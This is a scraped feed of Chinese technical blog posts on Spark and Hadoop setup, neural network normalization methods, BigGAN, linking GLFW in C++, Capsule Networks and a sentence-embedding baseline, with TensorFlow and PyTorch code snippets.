gedit .bashrc 写入 12export SPARK_HOME=/usr/local/sparkexport PATH=$PATH:$SPARK_HOME/bin:$SPARK_HOME/sbin 1source .bashrc 1234cd /usr/local/spark/cp ./conf/spark-env.sh.template ./conf/spark-env.shsudo gedit ./conf/spark-env.sh 写入 1234567export SPARK_DIST_CLASSPATH=$(/usr/local/hadoop/bin/hadoop classpath)export HADOOP_CONF_DIR=/usr/local/hadoop/etc/hadoopexport PYSPARK_PYTHON=/usr/bin/python3export PYSPARK_DRIVER_PYTHON=/usr/bin/ipython3# 在notebook中运行pyspark# export PYSPARK_DRIVER_PYTHON_OPTS=\"notebook\" 使用HDFS中文件时，先要启动Hadoop 测试 master机器上 123cd ~mkdir wordcount/input -pcp /usr/local/hadoop/LICENSE.txt ~/wordcount/input 1start-all.sh 1234hadoop fs -mkdir -p /user/ray/wordcount/inputcd ~/wordcount/inputhadoop fs -copyFromLocal LICENSE.txt /user/ray/wordcount/inputhadoop fs -ls /user/ray/wordcount/input","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"spark","slug":"Tools/spark","permalink":"https://racleray.github.io/categories/Tools/spark/"}],"tags":[{"name":"spark","slug":"spark","permalink":"https://racleray.github.io/tags/spark/"},{"name":"tools","slug":"tools","permalink":"https://racleray.github.io/tags/tools/"}]},{"title":"神经网络normalization","slug":"神经网络normalization","date":"2020-10-19T11:32:28.000Z","updated":"2023-08-07T11:54:31.047Z","comments":true,"path":"posts/5de6e8e6.html","link":"","permalink":"https://racleray.github.io/posts/5de6e8e6.html","excerpt":"记录Normalization相关方法，以及一点点思考。","text":"深度学习中的Normalization，BN/LN/WN 为什么需要 Normalization independent and identically distributed，简称为 i.i.d 并非所有机器学习模型的必然要求（比如 Naive Bayes 模型就建立在特征彼此独立的基础之上，而Logistic Regression 和 神经网络 则在非独立的特征数据上依然可以训练出很好的模型），但独立同分布的数据可以简化常规机器学习模型的训练、提升机器学习模型的预测能力，已经是一个共识。 白化（whitening） 数据预处理步骤。 （1）去除特征之间的相关性 —&gt; 独立； （2）使得所有特征具有相同的均值和方差 —&gt; 同分布。 深度学习中的 Internal Covariate Shift 参数更新使每一层的数据分布发生变化，向前叠加，高层的受到数据变化的影响，需要不断重新适应底层的数据变化。 Internal Covariate Shift，简称 ICS. ML经典假设是“源空间（source domain）和目标空间（target domain）的数据分布（distribution）是一致的” covariate shift是指源空间和目标空间的条件概率是一致的，但是其边缘概率不同 ​ 1. 给定输入，拟合label，条件概率一致的 层间计算导致，各层分布发生改变，边缘概率是不同的 ICS的问题 上层参数需要不断适应新的输入数据分布，降低学习速度 下层输入的变化可能趋向于变大或者变小，导致上层落入饱和区，使得学习过早停止 (想想sigmoid) 每层的更新都会影响到其它层，因此每层的参数更新策略需要尽可能的谨慎 Normalization 的通用框架与基本思想 标准的白化操作代价高昂，特别是我们还希望白化操作是可微的（每一点上必存在非垂直切线），保证白化操作可以通过反向传播来更新梯度。 Normalization 方法退而求其次，进行了简化的白化操作。 Normalization 先对其做平移和伸缩变换， 将 的分布规范化成在固定区间范围的标准分布。 是平移参数（shift parameter）， 是缩放参数（scale parameter） 是再平移参数（re-shift parameter）， 是再缩放参数（re-scale parameter） 最终得到的数据符合均值为 、方差为 的分布 变换为均值为 、方差为 的分布，也并不是严格的同分布，只是映射到了一个确定的区间范围而已 再平移调整的意义 不会过分改变每一层计算结果 第一步的规范化会将几乎所有数据映射到激活函数的非饱和区（线性区），仅利用到了线性变化能力，从而降低了神经网络的表达能力。而进行再变换，则可以将数据从线性区变换到非线性区，恢复模型的表达能力（想想激活函数） 主流 Normalization 方法梳理 Batch Normalization —— 纵向规范化：整个batch的不同维度（channel） image 其中 是 mini-batch 的大小。由于 BN 是针对单个维度定义的，因此标准公式中的计算均为 element-wise。 然后，用一个 mini-batch 的一阶统计量和二阶统计量，规范每一个输入维度 KEYPOINT：mini-batch数据决定，x每个维度的分布，上图可理解为RGB三个通道。 要求：每个 mini-batch 比较大，数据分布比较接近，充分的 shuffle 不适用：动态的网络结构 和 RNN 网络 （最后才知道mini-batch的\\(\\mu\\)）。Batch Normalization基于一个mini batch的数据计算均值和方差，而不是基于整个Training set来做，相当于进行梯度计算式引入噪声。因此，Batch Normalization不适用于对噪声敏感的强化学习、生成模型（Generative model：GAN，VAE）使用。 12345678910111213141516171819def batch_normalization_layer(inputs, out_size, isTrain=True): # in_size, out_size = inputs.get_shape() pop_mean = tf.Variable(tf.zeros([out_size]),trainable=False) pop_var = tf.Variable(tf.ones([out_size]),trainable=False) scale = tf.Variable(tf.ones([out_size])) shift = tf.Variable(tf.zeros([out_size])) eps = 0.001 decay = 0.999 if isTrain: # batch的mean和var。 注原始维度为[batch_size, height, width, channel] batch_mean, batch_var = tf.nn.moments(inputs,[0,1,2]) print(batch_mean.get_shape()) # 记录训练的mean和var train_mean = tf.assign(pop_mean, pop_mean * decay + batch_mean * (1-decay)) train_var = tf.assign(pop_var, pop_var * decay + batch_var * (1-decay)) with tf.control_dependencies([train_mean,train_var]): return tf.nn.batch_normalization(inputs,batch_mean,batch_var,shift,scale,eps) else: return tf.nn.batch_normalization(inputs,pop_mean,pop_var,shift,scale,eps) Layer Normalization —— 横向规范化：单个输入 https://arxiv.org/abs/1607.06450 image 考虑一层所有维度的输入，计算该层的平均输入值和输入方差，然后用同一个规范化操作来转换各个维度的输入 枚举了该层所有的输入神经元。对应到标准公式中，四大参数 , , , 均为标量（BN中是向量），所有输入共享一个规范化变换 KEYPOINT：LN 针对单个训练样本进行，用于 小mini-batch场景、动态网络场景和 RNN，特别是自然语言处理领域。此外，LN 不需要保存 mini-batch 的均值和方差，节省了额外的存储空间 NOTE：如果不同输入特征不属于相似的类别（比如颜色和大小），那么 LN 的处理可能会降低模型的表达能力。 1234567891011121314151617class layer_norm(Function): @staticmethod def forward(input, gain=None, bias=None): # 这里的输入是unroll的，[batch_size, h x w x c]，按实例norm mean = input.mean(-1, keepdim=True) var = input.var(-1, unbiased=False, keepdim=True) input_normalized = (input - mean) / torch.sqrt(var + 1e-9) if gain is not None and bias is not None: output = input_normalized * gain + bias elif not (gain is None and bias is None): raise RuntimeError(\"gain and bias of LayerNorm should be both None or not None!\") else: output = input_normalized return output ... Weight Normalization —— 参数规范化 https://arxiv.org/abs/1602.07868 将以下方程 理解为： . BN 和 LN 均将规范化应用于输入的特征数据 WN将规范化应用于线性变换的权重 用神经元的权重的欧氏范数对输入数据进行 scale。 是神经元的权重的欧氏范数，因此 是单位向量，决定了 的方向； 是标量，决定了 的长度。 KEYPOINT：WN 的规范化不直接使用输入数据的统计量，因此避免了 BN 过于依赖 mini-batch 的不足，以及 LN 每层唯一转换器的限制，同时也可以用于动态网络结构 Weight Normalization对通过标量g和向量v对权重W进行重写，重写向量v是固定的，因此，基于Weight Normalization的Normalization比Batch Normalization引入更少的噪声。 123456789101112131415161718192021222324def _weight_norm(v, g): 'v就是weights' norm = torch.norm(v, 2) return v * (g * norm)def norm_except_dim(v, pow, dim): '计算g： norm_except_dim(weight, 2, dim).data' if dim is None: return v.norm() if dim != 0: v = v.transpose(0, dim) output_size = (v.size(0),) + (1,) * (v.dim() - 1) v = v.contiguous().view(v.size(0), -1).norm(dim=1).view(*output_size) if dim != 0: v = v.transpose(0, dim) return vclass WeightNorm: ... def compute_weight(self, module): g = getattr(module, self.name + '_g') v = getattr(module, self.name + '_v') return _weight_norm(v, g) ... Cosine Normalization —— 余弦规范化 其中 是 和 的夹角。所有的数据就都是 [-1, 1] 区间。 超简单的变化，直接在wx的上scale，并且不需要再次缩放。 将 点积》》》变为余弦相似度 Instance Norm image InstanceNorm等价于当Group Norm的num_groups等于num_channel. Group Norm https://arxiv.org/abs/1803.08494 image 当Group Norm中group的数量是1的时候, 是与LayerNorm是等价的 12345678910111213def GroupNorm(x, gamma, beta, G, eps=1e−5): # x: input features with shape [N,C,H,W] # gamma, beta: scale and offset, with shape [1,C,1,1] # G: number of groups for GN N, C, H, W = x.shape # group划分 x = tf.reshape(x, [N, G, C // G, H, W]) # 按group求mean var mean, var = tf.nn.moments(x, [2, 3, 4], keepdims=True) x = (x−mean) / tf.sqrt(var + eps) x = tf.reshape(x, [N, C, H, W]) return x∗gamma + beta Normalization 为什么会有效？ 权重伸缩不变性（weight scale invariance） 其中 。 由于 因此，权重的伸缩变化不会影响反向梯度的 Jacobian 矩阵，因此也就对反向传播没有影响，避免了反向传播时因为权重过大或过小导致的梯度消失或梯度爆炸问题，从而加速了神经网络的训练 参数正则 由于 因此，下层的权重值越大，\\(\\lambda\\)越大，那么其梯度就越小。这样，参数的变化就越稳定，相当于实现了参数正则化的效果，避免参数的大幅震荡，提高网络的泛化性能。 数据伸缩不变性（data scale invariance） 当数据 按照常量 进行伸缩时，得到的规范化后的值保持不变，即： 其中 。 数据伸缩不变性仅对 BN、LN 和 CN 成立。WN 不具有这一性质。很明显。 数据伸缩不变性可以有效地减少梯度弥散，简化对学习率的选择 某一层神经元 而言，展开可得（以下式子为示意，没写入激活函数） 每一层神经元的输出依赖于底下各层的计算结果。再次回忆activition function的图像 如果没有正则化，当下层输入发生伸缩变化时，经过层层传递，可能会导致数据发生剧烈的膨胀或者弥散，从而也导致了反向计算时的梯度爆炸或梯度弥散。 而言，其输入 永远保持标准的分布，这就使得高层的训练更加简单。从梯度的计算公式来看： 数据的伸缩变化也不会影响到对该层的权重参数更新，使得训练过程更加鲁棒，简化了对学习率的选择。 参考链接：https://zhuanlan.zhihu.com/p/33173246","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"}],"tags":[{"name":"deep learning","slug":"deep-learning","permalink":"https://racleray.github.io/tags/deep-learning/"},{"name":"normalization","slug":"normalization","permalink":"https://racleray.github.io/tags/normalization/"}]},{"title":"Large scale GAN training for high fidelity natural image synthesis","slug":"Large-scale-GAN-training-for-high-fidelity-natural-image-synthesis","date":"2020-08-04T08:08:56.000Z","updated":"2023-08-07T11:54:31.031Z","comments":true,"path":"posts/204efe7c.html","link":"","permalink":"https://racleray.github.io/posts/204efe7c.html","excerpt":"这是得空听百度paddle平台公开课的一个小作业，选了一篇很简单的论文读读。结论有一定参考价值，虽然很少用到GAN。","text":"问题 GAN生成图像的过程是一个敏感的过程。虽然相比于VAE，其优化目标从Elmo最优损失函数的一个下界，变为直接优化生成结果和目标之间差异损失本身，直觉上是一种更好的方法，但是由于动态地交叉训练生成器与判别器，导致对网络设计、训练方法、参数设置等非常敏感。 尽管有研究表明在经验和理论上，获得了在多种设置中可以实现稳定训练的结论。但是GAN生成网络的效果始终有点差强人意。 当前在Image Net建模上的最佳结果仅达到了52.5的IS，而真实数据有233的IS。 Is( inception score)：用来衡量GAN网络的两个指标: 生成图片的质量和多样性 entropy = -sum(p_i * log(p_i)) The conditional probability captures our interest in image quality. KL (C || M) : KL divergence = p(y|x) * (log(p(y|x)) – log(p(y))) The average of the KL divergence for all generated images. C for conditional and M for marginal distributions. 1234567891011121314151617181920# calculate inception score in numpyfrom numpy import asarrayfrom numpy import expand_dimsfrom numpy import logfrom numpy import meanfrom numpy import exp # calculate the inception score for p(y|x)def calculate_inception_score(p_yx， eps=1E-16): # calculate p(y) p_y = expand_dims(p_yx.mean(axis=0)， 0) # kl divergence for each image kl_d = p_yx * (log(p_yx + eps) - log(p_y + eps)) # sum over classes sum_kl_d = kl_d.sum(axis=1) # average over images avg_kl_d = mean(sum_kl_d) # undo the logs is_score = exp(avg_kl_d) return is_score 但是有一个缺陷，概率计算是建立在Inception数据集限制的1000种类别中的，不在其中的类别则无法评估，同时要达到较好的效果，计算score时，不同类别中的数据分布最好是比较均匀的。 《Large scale GAN training for high fidelity natural image synthesis》的研究正是探索生成效果的一项成果，作者成功地将GAN生成图像和真实图像之间的保真度和多样性gap大幅降低。 方法 高分辨率能够带来更为真实的生成图像，在这样的思想的指导下，本论文结合了GAN的各种新技术，并且分析了训练难的原因，最后提出自己的模型。 本文展示了GAN可以从训练规模中显著获益，并且能在参数数量很大和八倍Batch size于之前最佳结果，的条件下，仍然能以2倍到4倍的速度进行训练。 作者引入了两种简单的生成架构变化，提高了可扩展性，并修改了正则化方案以提升conditioning，通过实验说明了这样可以提升性能。 image 这篇论文没有提出新的模型，只是将原有的GAN的模型： 用8倍原有的batch size大小 将隐层的变量数量扩充到原有模型的4倍 训练获得了很好的图片生成的效果。与此同时，在扩充了变量数量和 batch size大小后，模型出现了不稳定的现象。 文章中对出现的不稳定现象，采用现有的比较有效的稳定训练GAN的方法，但是文中发现这样确实会稳定GAN的训练，但是同时会栖牲生成图片的质量。 实验结果 研究表明按8的倍数增加批大小可以将当前最佳的IS提高46%。 研究者假设这是由于每个批量覆盖了更多的模式，为生成器和鉴别器都提供了更好的梯度信息。 这种扩扆带来的值得注意的副作用是，模型以更少的迭代次数达到了更好的性能，但变得不稳定并且遭遇了完全的训练崩溃。 因此在实验中，研究者在崩溃刚好发生之后立刻停止训练，并从之前保存的检查点进行结果报告。 增加了每个层50%的宽度(通道数量)，进一步的21%的IS提升。 生成器和鉴别器中的参数数量几乎翻倍。研究者假设这是由于模型相对于数据集复杂度的容量的增加。将深度翻倍，在ImageNet Based模型上，反而会降低性能。 其他技巧 截断技巧 生成器的随机噪声输入一般使用正态分布或者均匀分布的随机数。 本文采用了截断技术，对正态分布的随机数进行截断处理，实验发现这种方法的结果最好。 对此的直观解释是，如果网络的随机噪声输入的随机数变动范围越大，生成的样本在标准模板上的变动就越大，因此样本的多样性就越强，但真实性可能会降低。 首先用截断态分布N（0，1）随机数产生噪声向量Z，具体做法是如果随机数超出一定范围，则重新采样，使得其落在这个区间里。 这种做法称为截断技巧：向量Z的模超过某一指定阈值的随机数进行重釆样，这样可以提高单个样本的质量，但代价是降低了样本的多样性。 实验后分析 生成器的不稳定性 本文着重对小规模时稳定，大规模时不稳定的问题进行分析。 实验中发现，权重矩阵的前3个奇异值σ0，σ1，σ2蘊含的信息最丰富。 在训练中，G的大部分层的谱范数都是正常的，但有一些是病态的，这些谱范数随着训练的进行不断的增长，最后爆炸，导致训练坍塌。 结论 本文证明了将GAN用于多类自然图像生成任务时，加大模型的规模可以显著的提高生成的图像的质量，对生成的样本的真实性和多样性都是如此。 通过使用一些技巧，本文提出的方法的性能较之前的方法有了大度的提高。 另外，还分析了大规模GAN在训练时的机制，用它们的权重矩阵的奇异值来刻画它们的稳定性。 讨论了稳定性和性能即生成的图像的质量之间的相互作用和影响 参考链接： 百度论文复现课程：https://aistudio.baidu.com/aistudio/education/group/info/1340","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"}],"tags":[{"name":"gan","slug":"gan","permalink":"https://racleray.github.io/tags/gan/"}]},{"title":"C++ Project使用外部库","slug":"C-Project使用外部库","date":"2020-07-08T04:59:37.000Z","updated":"2023-08-07T11:54:31.026Z","comments":true,"path":"posts/b7fe0c52.html","link":"","permalink":"https://racleray.github.io/posts/b7fe0c52.html","excerpt":"记录尝试GLFW demo程序时踩得一点坑，毕竟刚开始接触C++。","text":"Static link 更快速，编译时会优化。在visual studio中需要添加header file和lib file路径。以GLFW库的使用为例 在project文件夹下新建Dependencies文件夹，将下载的 include 和 lib-vc2017 复制到文件夹下。 添加 include 下的header file 添加lib file 添加目标static lib file到project。文件位于lib-vc2017文件夹下。 Dynamic link lib-vc2017文件夹下，还有glfw3dll.lib，这是动态链接需要导入的lib file。即替换上图中的glfw3.lib为glfw3dll.lib。 但是需要注意，dll文件需要与可执行文件 xxx.exe 位于同一个文件夹下，在程序运行时动态链接。否则会报错。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"CS","slug":"Notes/CS","permalink":"https://racleray.github.io/categories/Notes/CS/"}],"tags":[{"name":"c++","slug":"c","permalink":"https://racleray.github.io/tags/c/"},{"name":"library","slug":"library","permalink":"https://racleray.github.io/tags/library/"}]},{"title":"Capsule Net","slug":"CapsuleNet","date":"2020-07-07T11:55:17.000Z","updated":"2023-08-07T11:54:31.028Z","comments":true,"path":"posts/cd141949.html","link":"","permalink":"https://racleray.github.io/posts/cd141949.html","excerpt":"记录 Capsule Net 相关概率思想，虽然很少用到，但是它的网络设计挺有意思的。","text":"一个 capsule 是一组神经元，capsule activity vector 表示特定类型的实体（例如对象或对象部分）的实例化参数。activity vector的长度来表示实体存在的概率，方向表示实例化参数。前一层capsule通过转换矩阵对下一层capsule的实例化参数进行预测。该网络相比于CNN，对于重叠的目标，识别效果更好且能分离出重叠目标。算法使用 iterative routing-by-agreement mechanism，高层级的capsule的activity vector的计算过程将接收低层capsule的计算结果。 相比于CNN，Caps Net用vector-output capsules代替CNN的scalar-output feature detectors，并使用routing-by-agreement代替max-pooling Motivation ​ 人的视觉系统通常之关注图像中很小部分的重要信息，这部分信息视觉系统通过高分辨率处理，而其他不重要的信息常常就忽略掉。 ​ 处理这部分重要信息的模型，文章叫做single fixation。假设single fixation可以提取的信息不仅仅是某一个事物的特征，而是某一个类型的特征信息，并且在建模过程中忽略每一个fixation之间相互左右的规律。只要求模型解析出每一个single fixation。 ​ 一个capsule代表图像中一个部分的目标信息，并且文章中提到“感知拥挤“的研究，来支撑 一个capsule只代表一个目标信息的合理性。 image ​ capsule可以代表目标的很多信息，文章将capsule输出vector的长度约束在1以内，代表存在概率；vector的方向代表目标的特征。 ​ capsule的学习的信息具有一种全局的相关性。这样可以解决以下的问题。CNN倾向于局部特征的检测，整体上的空间关系对其预测结果的影响较小。实际上不是人脸的照片，在此处都检测为正确。 Vector inputs and outputs of a capsule ​ 根据长度代表出现概率的思路，文章提出了以下“激活函数”： image ​ 输出将确保short vectors长度趋于0，long vectors长度趋于1。角度代表的信息由矩阵变换和低层不同特征的向量加权求和得到。 ​ u来自低层级的capsule的输出。\\(c_{ij}\\)由iterative dynamic routing process计算。\\(b_{ij}\\)首先作为log先验概率初始化，在每一步迭代中更新概率。 ​ \\(c_{ij}\\)相当于CNN中max pooling干的事。感觉有点像attention，iterative attention。 image image ​ 这种“routing-by-agreement”应该比通过max-pooling实现的非常原始的路由形式更加有效。后者可以使一层中的神经元忽略该层中除了最活跃的特征之外的所有特征。前者层层迭代，层层parsing，信息损失自然更少。 ​ 之后，Hinton又提出了EM routing[Matrix capsules with EM routing. ICLR (2018)]。 通过计算Existence probability和概率分布完成不同层间的计算，简单示意图如下。code reference image max-pooling problem ​ max-pooling还存在以下问题： 甚至不能区分左和右 对rotation不敏感，不能学习到方向信息 一次只能‘看到’一个object max-pooling只做到spatial invariance image 而不能做到spatial equivariance image capsule net通过： image 计算下一层capsule经过W变换后的u，进行组合，得到不同的结果。错误的预测route被裁剪(pruned)，模型具有一定的spatial equivariance。 image Margin loss for digit existence ​ 分别对每个类别计算损失，同时注意只有capsule对应的部分出现某类目标，才计算损失。 image ​ \\(T_k\\)只有在class k出现的时候等于1。 image ​ \\(\\lambda\\)是为了防止，限制vector长度后在训练开始阶段由于没有识别到目标导致的学习停滞问题，取0.5。总体存在性检测loss是所有类别capsule的损失之和。 ​ 整体损失，还要加上capsule重构图像特征的损失。 image CapsNet architecture image image ​ 32个capsule，每个8维。 image ​ 转换后，每个class capsule16维，不同而维度影响重构图像的不同特征。 ​ routing-by-agreement的迭代过程就是不同的route squash结果进行裁剪的过程，计算结果相差大的route逐渐被移除。 image ​ EM route则是计算primry结果和route squash结果分布的差异。 image ​ capsule输出vector的长度约束在1以内，代表存在概率；vector的方向代表目标的特征。 ​ 其中每个capsule的转化矩阵都是独立的不同的，每个class对应一个capsule。 ​ A simple CapsNet with 3 layers. PrimaryCaps计算第一层capsules的输入， DigitCaps计算部分使用iterative dynamic routing，计算输出capsules。 ​ 重构图像网络，采用训练好的DigitCaps，在此基础上训练重构网络，计算图像特征重构损失。只需要将true label的capsule提取出来进行重构计算即可。因此，多个数字重合的重构也能实现。 Code ​ 重要的网络构建代码如下，完整代码 ​ Caps Net训练相对于CNN慢很多，并且只使用一层dynamic routing，参数量也更大，batch size相比CNN也要取得小一些，在相同条件下。 ​ 网络收敛比较快，而且计算过程损失的变化相对稳定。下图为第一轮训练结果。 ​ 第二轮计算结果 ​ 相关layer定义，以下代码参考了 https://github.com/XifengGuo/CapsNet-Pytorch ，https://github.com/naturomics/CapsNet-Tensorflow.git。 在其上修改了写网络计算过程。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111import torchimport torch.nn as nnimport torch.nn.functional as Ffrom torch.autograd import Variabledef squash(inputs, axis=-1): \"\"\"capsule输出的激活函数\"\"\" norm = torch.norm(inputs, dim=axis, keepdim=True) scale = norm ** 2 / (1 + norm ** 2) / (norm + 1e-8) return scale * inputsclass PrimaryCaps(nn.Module): \"\"\"计算第一层capsules的输入，转换成32*6*6个8维的capsule vector in_channels：原文中256 out_channels：卷积后的通道数，原文中256 dim_caps: PrimaryCaps输出的每个capsule的维度 kernel_size：原文中9 * 9 stride：2 \"\"\" def __init__(self, in_channels, out_channels, dim_caps, kernel_size, stride=1, padding=0): super(PrimaryCaps, self).__init__() self.dim_caps = dim_caps self.conv2d = nn.Conv2d(in_channels, out_channels, kernel_size=kernel_size, stride=stride, padding=padding) def forward(self, input): \"\"\"转换成32*6*6个8维的capsule vector, output size=[batch_size, num_caps, dim_caps]\"\"\" output = self.conv2d(input) output = output.view(input.size(0), -1, self.dim_caps) return squash(output)class DenseCaps(nn.Module): \"\"\"iterative dynamic routing计算capsule目标识别结果vector。 input size = [None, in_num_caps, in_dim_caps]， output size = [None, out_num_caps, out_dim_caps]。 in_num_caps: 第一层的输入capsule数量，32*6*6 in_dim_caps：第一层的输入capsule维度，8 out_num_caps：iterative dynamic routing时及输出的capsule数量，10 out_dim_caps：iterative dynamic routing时及输出的capsule维度，16 iterations：dynamic routing轮次 weight：由32*6*6个8维的capsule vector计算10个16维的capsule vector的transform matrix，在每个[6 * 6] 单元内的capsule是共享权重的。 \"\"\" def __init__(self, in_num_caps, in_dim_caps, out_num_caps, out_dim_caps, iterations=3): super(DenseCaps, self).__init__() self.in_num_caps = in_num_caps self.in_dim_caps = in_dim_caps self.out_num_caps = out_num_caps self.out_dim_caps = out_dim_caps self.iterations = iterations self.weight = nn.Parameter(0.01 * torch.randn(1, in_num_caps, out_num_caps * out_dim_caps, in_dim_caps, 1)) def forward(self, u): \"\"\"u_hat在不同layer的capsules之间传递，每层capsules只能是才c，b在更新。文中结构只接上了一层 dynamic routing capsules layer。\"\"\" # self.weight * u # [1 , in_num_caps, out_num_caps * out_dim_caps, in_dim_caps, 1] # [batch, in_num_caps, out_num_caps * out_dim_caps, in_dim_caps, 1] # =&gt;&gt; [batch, in_num_caps, out_num_caps * out_dim_caps, in_dim_caps, 1] # 按元素相乘，然后在reduce sum u_hat = u[:, :, None, :, None] u_hat = self.weight * u_hat.repeat(1, 1, self.out_num_caps * self.out_dim_caps, 1, 1) u_hat = torch.sum(u_hat, dim=3) # [batch, in_num_caps, out_num_caps, out_dim_caps] u_hat = torch.squeeze(u_hat.view(-1, self.in_num_caps, self.out_num_caps, self.out_dim_caps, 1)) u_hat_for_route = u_hat.detach() # coupling coefficient initialize # [batch, in_num_caps, out_num_caps] b = Variable(torch.zeros(u.size(0), self.in_num_caps, self.out_num_caps)).cuda() for i in range(self.iterations): c = F.softmax(b, dim=2) # [batch, in_num_caps, out_num_caps] if i &lt; self.iterations - 1: # u [batch, in_num_caps, out_num_caps, out_dim_caps] # c [batch, in_num_caps, out_num_caps, 1] # =&gt;&gt; [batch, 1, out_num_caps, out_dim_caps] outputs = squash(torch.sum(torch.unsqueeze(c, 3) * u_hat_for_route, dim=1, keepdims=True)) b = b + torch.sum(outputs * u_hat_for_route, dim=-1) else: # 此时进入bp计算 outputs = squash(torch.sum(torch.unsqueeze(c, 3) * u_hat, dim=1, keepdims=True)) # [batch, out_num_caps, out_dim_caps] return torch.squeeze(outputs, dim=1)def caps_loss(y_true, y_pred, x, x_reconstruct, lamada): \"\"\"Capsule loss = Margin loss + lamada * reconstruction loss. y shape [batch, classes], x shape [batch, channels, height, width]\"\"\" L = y_true * torch.clamp(0.9 - y_pred, min=0) ** 2 + \\ 0.5 * (1 - y_true) * torch.clamp(y_pred - 0.1, min=0) ** 2 L_margin = L.sum(dim=1).mean() L_recon = nn.MSELoss()(x_reconstruct, x) return L_margin + lamada * L_recon ​ 网络定义 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import torchimport torch.nn.functional as Ffrom torch.autograd import Variablefrom torch import nnfrom layers import DenseCaps, PrimaryCapsclass CapsuleNet(nn.Module): \"\"\" Input: (batch, channels, width, height) Output:((batch, classes), (batch, channels, width, height)) input_size: [channels, width, height] classes: number of classes iterations：dynamic routing iterations \"\"\" def __init__(self, input_size, classes, iterations): super(CapsuleNet, self).__init__() self.input_size = input_size self.classes = classes self.iterations = iterations # Layer 1: Just a conventional Conv2D layer self.conv1 = nn.Conv2d(input_size[0], 256, kernel_size=9, stride=1, padding=0) # Layer 2: Conv2D layer with `squash` activation, then reshape to [None, num_caps, dim_caps] self.primarycaps = PrimaryCaps(256, 256, 8, kernel_size=9, stride=2, padding=0) # Layer 3: Capsule layer. iterative dynamic routing. self.digitcaps = DenseCaps(in_num_caps=32*6*6, in_dim_caps=8, out_num_caps=classes, out_dim_caps=16, iterations=iterations) # reconstruction net self.reconstructor = nn.Sequential( nn.Linear(16*classes, 512), nn.ReLU(inplace=True), nn.Linear(512, 1024), nn.ReLU(inplace=True), nn.Linear(1024, input_size[0] * input_size[1] * input_size[2]), nn.Sigmoid() ) self.relu = nn.ReLU() def forward(self, x, y=None): x = self.relu(self.conv1(x)) x = self.primarycaps(x) x = self.digitcaps(x) # [batch, out_num_caps, out_dim_caps] length = x.norm(dim=-1) # vector lenght代表存在概率 [batch, out_num_caps, 1] if y is None: # during testing, no label given. create one-hot coding using `length` index = length.max(dim=1)[1] # 将index处，更改为1 y = Variable(torch.zeros(length.size()).scatter_(1, index.view(-1, 1).cpu().data, 1.).cuda()) # y[:, :, None]: mask reconstruction = self.reconstructor((x * y[:, :, None]).view(x.size(0), -1)) # 存在概率预测，重构图像像素 return length, reconstruction.view(-1, *self.input_size) Other capsules Text ​ 使用capsule nets处理文本的简单架构[Investigating capsule networks with dynamic routing for text classification. EMNLP (2018)]，如下图所示。 image Graph ​ 结合GNN的简单网络示意[Capsule Graph Neural Network. ICLR (2018)]。 image 3D point cloud ​ 3D重构[3D Point-Capsule Networks. CVPR, (2019)] image Applications ​ Relation extraction，Adversary detection，Brain tumor classification，Classification of Breast Cancer. ​ 比如，Relation extraction方面的研究[Multi-labeled Relation Extraction with Attentive Capsule Network. AAAI (2018)] image ​ [Attention-Based Capsule Networks with Dynamic Routing for Relation Extraction. EMNLP 2018] image Problems Optimizing routing 当存在较多class时，参数量很大 不能驾驭大规模数据集 Resources CVPR2019 Tutorial","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DL","slug":"Notes/DL","permalink":"https://racleray.github.io/categories/Notes/DL/"}],"tags":[{"name":"capsule","slug":"capsule","permalink":"https://racleray.github.io/tags/capsule/"}]},{"title":"A Sentence Embedding Baseline","slug":"A-SENTENCE-EMBEDDINGS-Baseline","date":"2020-07-07T11:45:39.000Z","updated":"2023-08-07T11:54:31.024Z","comments":true,"path":"posts/8be3b59a.html","link":"","permalink":"https://racleray.github.io/posts/8be3b59a.html","excerpt":"记录普林斯顿大学对 SENTENCE EMBEDDING 进行优化的论文，使用SVD来区分出“无区分度的共有信息”和“有区分度的信息”，一种优化 SENTENCE EMBEDDING 的简单方法。","text":"论文《A SIMPLE BUT TOUGH-TO-BEAT BASELINE FOR SENTENCE EMBEDDINGS》 Info: 类别: [engineering ; pragmatic] 研究目标 提升Towards universal paraphrastic sentence embeddings（John Wieting, Mohit Bansal, Kevin Gimpel, and Karen Livescu. ）论文提出的监督学习方法，转而进行无监督学习。 提升基于word embedding的句子向量的表现力。 研究成果： completely unsupervised sentence embedding improves performance by about 10% to 30% in textual similarity tasks, and beats sophisticated supervised methods including RNN’s and LSTM’s. new “smoothing” terms that allow for words occurring out of context, as well as high probabilities for words like and, not in all contexts. 存在的问题： 在sentiment相关任务上，效果一般，与LSTM相差较大。 在下游任务为监督学习任务时，效果一般，没有LSTM、Skip-thought等方法有效。 关键词：sentence embedding，无监督学习 Brief Summary: 这项工作提供了一种简单的句子嵌入方法，基于随机游走模型生成句子文本(Arora et al.， 2016)。它简单且无监督，但在各种文本相似性任务上，它的性能明显优于基线，甚至可以击败一些复杂的监督方法，如RNN和LSTM模型。获得的embedding可以作为下游监督任务的特征，与复杂方法相比也能获得不错的结果。 Main Thought: 简单且无监督的Sentence embeddings计算方法。 在 textual similarity tasks上，当选取了合适参数，效果相比于词向量的简单平均、LSTM、Skip-thought等方法有一定提升。 image 上图b中，在不同的领域都是有用的。这对于无监督方法尤其重要，因为未标记的可用数据可以从目标应用程序的不同域中收集。 在下游任务为监督学习任务时，效果下降的原因 这可能是因为similarity任务直接依靠余弦相似性, 这使得该方法倾向于removing the common components(可视为一种去噪denoising)。 而在监督任务, 由于有一些标签的信息用于训练, 分类器可以挑出有用少见的components和忽视常见的components。 无视词序 然而基于LSTM、RNN的结果表明，词序在similarity任务上是有作用的。本文方法忽视了次序，可以考虑两者结合。 忽略词序的方法，更能找到sentiment层面的信息。 image 与Word2vec的联系 